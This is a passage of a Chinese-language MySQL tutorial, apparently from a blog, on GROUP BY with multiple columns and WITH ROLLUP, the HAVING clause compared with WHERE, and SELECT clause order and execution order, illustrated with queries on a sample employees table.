class="number">3215.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ST_CLERK   <span class="operator">|</span>  <span class="number">2785.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ST_MAN     <span class="operator">|</span>  <span class="number">7280.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------------+</span></span><br><span class="line"><span class="number">19</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>


<h3 id="（2）多个列分组"><a href="#（2）多个列分组" class="headerlink" title="（2）多个列分组"></a>（2）多个列分组</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 需求：查询各个department_id, job_id的平均工资</span><br><span class="line">mysql<span class="operator">&gt;</span> # 方式<span class="number">1</span>：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> department_id, job_id, <span class="built_in">AVG</span>(salary)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> department_id, job_id;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------+--------------+</span></span><br><span class="line"><span class="operator">|</span> department_id <span class="operator">|</span> job_id     <span class="operator">|</span> <span class="built_in">AVG</span>(salary)  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------+--------------+</span></span><br><span class="line"><span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span> SA_REP     <span class="operator">|</span>  <span class="number">7000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">10</span> <span class="operator">|</span> AD_ASST    <span class="operator">|</span>  <span class="number">4400.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">20</span> <span class="operator">|</span> MK_MAN     <span class="operator">|</span> <span class="number">13000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">20</span> <span class="operator">|</span> MK_REP     <span class="operator">|</span>  <span class="number">6000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">30</span> <span class="operator">|</span> PU_CLERK   <span class="operator">|</span>  <span class="number">2780.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">30</span> <span class="operator">|</span> PU_MAN     <span class="operator">|</span> <span class="number">11000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">40</span> <span class="operator">|</span> HR_REP     <span class="operator">|</span>  <span class="number">6500.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">50</span> <span class="operator">|</span> SH_CLERK   <span class="operator">|</span>  <span class="number">3215.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">50</span> <span class="operator">|</span> ST_CLERK   <span class="operator">|</span>  <span class="number">2785.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">50</span> <span class="operator">|</span> ST_MAN     <span class="operator">|</span>  <span class="number">7280.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">60</span> <span class="operator">|</span> IT_PROG    <span class="operator">|</span>  <span class="number">5760.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">70</span> <span class="operator">|</span> PR_REP     <span class="operator">|</span> <span class="number">10000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">80</span> <span class="operator">|</span> SA_MAN     <span class="operator">|</span> <span class="number">12200.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">80</span> <span class="operator">|</span> SA_REP     <span class="operator">|</span>  <span class="number">8396.551724</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">90</span> <span class="operator">|</span> AD_PRES    <span class="operator">|</span> <span class="number">24000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">90</span> <span class="operator">|</span> AD_VP      <span class="operator">|</span> <span class="number">17000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">100</span> <span class="operator">|</span> FI_ACCOUNT <span class="operator">|</span>  <span class="number">7920.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">100</span> <span class="operator">|</span> FI_MGR     <span class="operator">|</span> <span class="number">12000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">110</span> <span class="operator">|</span> AC_ACCOUNT <span class="operator">|</span>  <span class="number">8300.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">110</span> <span class="operator">|</span> AC_MGR     <span class="operator">|</span> <span class="number">12000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------+--------------+</span></span><br><span class="line"><span class="number">20</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 方式<span class="number">2</span>：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> job_id, department_id, <span class="built_in">AVG</span>(salary)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> job_id, department_id;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+---------------+--------------+</span></span><br><span class="line"><span class="operator">|</span> job_id     <span class="operator">|</span> department_id <span class="operator">|</span> <span class="built_in">AVG</span>(salary)  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+---------------+--------------+</span></span><br><span class="line"><span class="operator">|</span> AC_ACCOUNT <span class="operator">|</span>           <span class="number">110</span> <span class="operator">|</span>  <span class="number">8300.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> AC_MGR     <span class="operator">|</span>           <span class="number">110</span> <span class="operator">|</span> <span class="number">12000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> AD_ASST    <span class="operator">|</span>            <span class="number">10</span> <span class="operator">|</span>  <span class="number">4400.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> AD_PRES    <span class="operator">|</span>            <span class="number">90</span> <span class="operator">|</span> <span class="number">24000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> AD_VP      <span class="operator">|</span>            <span class="number">90</span> <span class="operator">|</span> <span class="number">17000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FI_ACCOUNT <span class="operator">|</span>           <span class="number">100</span> <span class="operator">|</span>  <span class="number">7920.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FI_MGR     <span class="operator">|</span>           <span class="number">100</span> <span class="operator">|</span> <span class="number">12000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HR_REP     <span class="operator">|</span>            <span class="number">40</span> <span class="operator">|</span>  <span class="number">6500.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> IT_PROG    <span class="operator">|</span>            <span class="number">60</span> <span class="operator">|</span>  <span class="number">5760.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MK_MAN     <span class="operator">|</span>            <span class="number">20</span> <span class="operator">|</span> <span class="number">13000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MK_REP     <span class="operator">|</span>            <span class="number">20</span> <span class="operator">|</span>  <span class="number">6000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PR_REP     <span class="operator">|</span>            <span class="number">70</span> <span class="operator">|</span> <span class="number">10000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PU_CLERK   <span class="operator">|</span>            <span class="number">30</span> <span class="operator">|</span>  <span class="number">2780.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PU_MAN     <span class="operator">|</span>            <span class="number">30</span> <span class="operator">|</span> <span class="number">11000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SA_MAN     <span class="operator">|</span>            <span class="number">80</span> <span class="operator">|</span> <span class="number">12200.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SA_REP     <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>  <span class="number">7000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SA_REP     <span class="operator">|</span>            <span class="number">80</span> <span class="operator">|</span>  <span class="number">8396.551724</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SH_CLERK   <span class="operator">|</span>            <span class="number">50</span> <span class="operator">|</span>  <span class="number">3215.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ST_CLERK   <span class="operator">|</span>            <span class="number">50</span> <span class="operator">|</span>  <span class="number">2785.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ST_MAN     <span class="operator">|</span>            <span class="number">50</span> <span class="operator">|</span>  <span class="number">7280.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+---------------+--------------+</span></span><br><span class="line"><span class="number">20</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 错误的！</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> department_id, job_id, <span class="built_in">AVG</span>(salary)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> department_id;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><code>SELECT</code>中出现的&#x3D;&#x3D;非组函数&#x3D;&#x3D;的字段必须声明在<code>GROUP BY</code> 中。 反之，<code>GROUP BY</code>中声明的字段可以不出现在<code>SELECT</code>中。</li>
<li><code>GROUP BY</code> 声明在<code>FROM</code>后面、<code>WHERE</code>后面，<code>ORDER BY</code> 前面、<code>LIMIT</code>前面 </li>
<li>MySQL中GROUP BY中使用<code>WITH ROLLUP</code></li>
</ul>
</blockquote>
<h3 id="（3）GROUP-BY中使用WITH-ROLLUP"><a href="#（3）GROUP-BY中使用WITH-ROLLUP" class="headerlink" title="（3）GROUP BY中使用WITH ROLLUP"></a>（3）GROUP BY中使用WITH ROLLUP</h3><p>使用 <code>WITH ROLLUP</code> 关键字之后，在所有查询出的分组记录之后增加一条记录，该记录计算查询出的所有记录的总和，即统计记录数量。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 查询整个公司的平均工资</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">AVG</span>(salary) <span class="keyword">FROM</span> employees;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">AVG</span>(salary) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">6461.682243</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 根据 <span class="keyword">GROUP</span> <span class="keyword">BY</span> 查询各个department_id的平均工资，最后一个字段就是整个公司的平均工资</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> department_id,<span class="built_in">AVG</span>(salary)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> department_id <span class="keyword">WITH</span> <span class="keyword">ROLLUP</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------+</span></span><br><span class="line"><span class="operator">|</span> department_id <span class="operator">|</span> <span class="built_in">AVG</span>(salary)  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------+</span></span><br><span class="line"><span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>  <span class="number">7000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">10</span> <span class="operator">|</span>  <span class="number">4400.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">20</span> <span class="operator">|</span>  <span class="number">9500.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">30</span> <span class="operator">|</span>  <span class="number">4150.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">40</span> <span class="operator">|</span>  <span class="number">6500.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">50</span> <span class="operator">|</span>  <span class="number">3475.555556</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">60</span> <span class="operator">|</span>  <span class="number">5760.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">70</span> <span class="operator">|</span> <span class="number">10000.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">80</span> <span class="operator">|</span>  <span class="number">8955.882353</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">90</span> <span class="operator">|</span> <span class="number">19333.333333</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">100</span> <span class="operator">|</span>  <span class="number">8600.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">110</span> <span class="operator">|</span> <span class="number">10150.000000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>  <span class="number">6461.682243</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------+</span></span><br><span class="line"><span class="number">13</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 说明：当使用<span class="keyword">ROLLUP</span>时，不能同时使用<span class="keyword">ORDER</span> <span class="keyword">BY</span>子句进行结果排序，即<span class="keyword">ROLLUP</span>和<span class="keyword">ORDER</span> <span class="keyword">BY</span>是互相排斥的。</span><br><span class="line">mysql<span class="operator">&gt;</span> # 错误的：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> department_id,<span class="built_in">AVG</span>(salary) avg_sal</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> department_id <span class="keyword">WITH</span> <span class="keyword">ROLLUP</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> avg_sal;</span><br></pre></td></tr></table></figure>



<h2 id="3-HAVING"><a href="#3-HAVING" class="headerlink" title="3. HAVING"></a>3. HAVING</h2><h3 id="（1）基本使用-1"><a href="#（1）基本使用-1" class="headerlink" title="（1）基本使用"></a>（1）基本使用</h3><blockquote>
<p><strong>过滤分组：HAVING子句</strong></p>
<ul>
<li>行已经被分组。</li>
<li>使用了聚合函数。</li>
<li>满足HAVING 子句中条件的分组将被显示。</li>
<li>HAVING 不能单独使用，必须要跟 GROUP BY 一起使用</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 查询各个部门中最高工资比<span class="number">10000</span>高的部门信息</span><br><span class="line">mysql<span class="operator">&gt;</span> # 错误的写法：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> department_id,<span class="built_in">MAX</span>(salary)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> <span class="built_in">MAX</span>(salary) <span class="operator">&gt;</span> <span class="number">10000</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> department_id;</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 要求<span class="number">1</span>：如果过滤条件中使用了聚合函数，则必须使用<span class="keyword">HAVING</span>来替换<span class="keyword">WHERE</span>。否则，报错。</span><br><span class="line">mysql<span class="operator">&gt;</span> # 要求<span class="number">2</span>：<span class="keyword">HAVING</span> 必须声明在 <span class="keyword">GROUP</span> <span class="keyword">BY</span> 的后面。</span><br><span class="line">mysql<span class="operator">&gt;</span> # 要求<span class="number">3</span>：开发中，我们使用<span class="keyword">HAVING</span>的前提是<span class="keyword">SQL</span>中使用了<span class="keyword">GROUP</span> <span class="keyword">BY</span>。</span><br><span class="line">mysql<span class="operator">&gt;</span> # 正确的写法：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> department_id,<span class="built_in">MAX</span>(salary)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> department_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">HAVING</span> <span class="built_in">MAX</span>(salary) <span class="operator">&gt;</span> <span class="number">10000</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+-------------+</span></span><br><span class="line"><span class="operator">|</span> department_id <span class="operator">|</span> <span class="built_in">MAX</span>(salary) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+-------------+</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">20</span> <span class="operator">|</span>    <span class="number">13000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">30</span> <span class="operator">|</span>    <span class="number">11000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">80</span> <span class="operator">|</span>    <span class="number">14000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">90</span> <span class="operator">|</span>    <span class="number">24000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">100</span> <span class="operator">|</span>    <span class="number">12000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">110</span> <span class="operator">|</span>    <span class="number">12000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+-------------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 查询部门id为<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>这<span class="number">4</span>个部门中最高工资比<span class="number">10000</span>高的部门信息</span><br><span class="line">mysql<span class="operator">&gt;</span> # 方式<span class="number">1</span>：推荐，执行效率高于方式<span class="number">2.</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> department_id,<span class="built_in">MAX</span>(salary)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> department_id <span class="keyword">IN</span> (<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> department_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">HAVING</span> <span class="built_in">MAX</span>(salary) <span class="operator">&gt;</span> <span class="number">10000</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+-------------+</span></span><br><span class="line"><span class="operator">|</span> department_id <span class="operator">|</span> <span class="built_in">MAX</span>(salary) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+-------------+</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">20</span> <span class="operator">|</span>    <span class="number">13000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">30</span> <span class="operator">|</span>    <span class="number">11000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+-------------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 方式<span class="number">2</span>：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> department_id,<span class="built_in">MAX</span>(salary)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> department_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">HAVING</span> <span class="built_in">MAX</span>(salary) <span class="operator">&gt;</span> <span class="number">10000</span> <span class="keyword">AND</span> department_id <span class="keyword">IN</span> (<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+-------------+</span></span><br><span class="line"><span class="operator">|</span> department_id <span class="operator">|</span> <span class="built_in">MAX</span>(salary) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+-------------+</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">20</span> <span class="operator">|</span>    <span class="number">13000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">30</span> <span class="operator">|</span>    <span class="number">11000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+-------------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.09</span> sec)</span><br></pre></td></tr></table></figure>


<blockquote>
<ul>
<li>当过滤条件中有聚合函数时，则此过滤条件必须声明在<code>HAVING</code>中。</li>
<li>当过滤条件中没有聚合函数时，则此过滤条件声明在<code>WHERE</code>中或<code>HAVING</code>中都可以。但是，建议大家声明在<code>WHERE</code>中。</li>
</ul>
</blockquote>
<h3 id="（2）WHERE和HAVING的对比"><a href="#（2）WHERE和HAVING的对比" class="headerlink" title="（2）WHERE和HAVING的对比"></a>（2）WHERE和HAVING的对比</h3><p><strong>区别1：WHERE 可以直接使用表中的字段作为筛选条件，但不能使用分组中的计算函数作为筛选条件；HAVING 必须要与 GROUP BY 配合使用，可以把分组计算的函数和分组字段作为筛选条件。</strong></p>
<p>这决定了，在需要对数据进行分组统计的时候，HAVING 可以完成 WHERE 不能完成的任务。这是因为，在查询语法结构中，WHERE 在 GROUP BY 之前，所以无法对分组结果进行筛选。HAVING 在 GROUP BY 之后，可以使用分组字段和分组中的计算函数，对分组的结果集进行筛选，这个功能是 WHERE 无法完成的。另  外，WHERE排除的记录不再包括在分组中。</p>
<p><strong>区别2：如果需要通过连接从关联表中获取需要的数据，WHERE 是先筛选后连接，而 HAVING 是先连接后筛选。</strong> </p>
<p>这一点，就决定了在关联查询中，WHERE 比 HAVING 更高效。因为 WHERE 可以先筛选，用一个筛选后的较小数据集和关联表进行连接，这样占用的资源比较少，执行效率也比较高。HAVING 则需要先把结果集准备好，也就是用未被筛选的数据集进行关联，然后对这个大的数据集进行筛选，这样占用的资源就比较多，执行效率也较低。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140111.png" alt="  "></p>
<blockquote>
<ul>
<li>WHERE 和 HAVING 也不是互相排斥的，我们可以在一个查询里面同时使用 WHERE 和 HAVING。包含分组统计函数的条件用 HAVING，普通条件用 WHERE。这样，我们就既利用了 WHERE 条件的高效快速，又发挥了HAVING可以使用包含分组统计函数的查询条件的优点。当数据量特别大的时候，运行效率会有很大的差别。</li>
</ul>
</blockquote>
<h2 id="4-SELECT的执行过程"><a href="#4-SELECT的执行过程" class="headerlink" title="4. SELECT的执行过程"></a>4. SELECT的执行过程</h2><h3 id="（1）查询的结构"><a href="#（1）查询的结构" class="headerlink" title="（1）查询的结构"></a>（1）查询的结构</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#方式<span class="number">1</span>：</span><br><span class="line"><span class="keyword">SELECT</span> ...,....,...</span><br><span class="line"><span class="keyword">FROM</span> ...,...,....</span><br><span class="line"><span class="keyword">WHERE</span> 多表的连接条件</span><br><span class="line"><span class="keyword">AND</span> 不包含组函数的过滤条件</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> ...,...</span><br><span class="line"><span class="keyword">HAVING</span> 包含组函数的过滤条件</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> ... <span class="keyword">ASC</span><span class="operator">/</span><span class="keyword">DESC</span></span><br><span class="line">LIMIT ...,...</span><br><span class="line"></span><br><span class="line">#方式<span class="number">2</span>：</span><br><span class="line"><span class="keyword">SELECT</span> ...,....,...</span><br><span class="line"><span class="keyword">FROM</span> ... <span class="keyword">JOIN</span> ...</span><br><span class="line"><span class="keyword">ON</span> 多表的连接条件</span><br><span class="line"><span class="keyword">JOIN</span> ...</span><br><span class="line"><span class="keyword">ON</span> ...</span><br><span class="line"><span class="keyword">WHERE</span> 不包含组函数的过滤条件</span><br><span class="line"><span class="keyword">AND</span><span class="operator">/</span><span class="keyword">OR</span> 不包含组函数的过滤条件</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> ...,...</span><br><span class="line"><span class="keyword">HAVING</span> 包含组函数的过滤条件</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> ... <span class="keyword">ASC</span><span class="operator">/</span><span class="keyword">DESC</span></span><br><span class="line">LIMIT ...,...</span><br><span class="line"></span><br><span class="line">#其中：</span><br><span class="line">#（<span class="number">1</span>）<span class="keyword">from</span>：从哪些表中筛选</span><br><span class="line">#（<span class="number">2</span>）<span class="keyword">on</span>：关联多表查询时，去除笛卡尔积</span><br><span class="line">#（<span class="number">3</span>）<span class="keyword">where</span>：从表中筛选的条件</span><br><span class="line">#（<span class="number">4</span>）<span class="keyword">group</span> <span class="keyword">by</span>：分组依据</span><br><span class="line">#（<span class="number">5</span>）<span class="keyword">having</span>：在统计结果中再次筛选</span><br><span class="line">#（<span class="number">6</span>）<span class="keyword">order</span> <span class="keyword">by</span>：排序</span><br><span class="line">#（<span class="number">7</span>）limit：分页</span><br></pre></td></tr></table></figure>


<h3 id="（3）SELECT执行顺序"><a href="#（3）SELECT执行顺序" class="headerlink" title="（3）SELECT执行顺序"></a>（3）SELECT执行顺序</h3><ul>
<li><strong>关键字的顺序是不能颠倒的：</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">FROM</span> ... <span class="keyword">WHERE</span> ... <span class="keyword">GROUP</span> <span class="keyword">BY</span> ... <span class="keyword">HAVING</span> ... <span class="keyword">ORDER</span> <span class="keyword">BY</span> ... LIMIT...</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>SELECT 语句的执行顺序：</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">HAVING</span> <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> 的字段 <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">DISTINCT</span> <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="operator">-</span><span class="operator">&gt;</span> LIMIT</span><br></pre></td></tr></table></figure>


<p>比如你写了一个 SQL 语句，那么它的关键字顺序和执行顺序是下面这样的：</p>
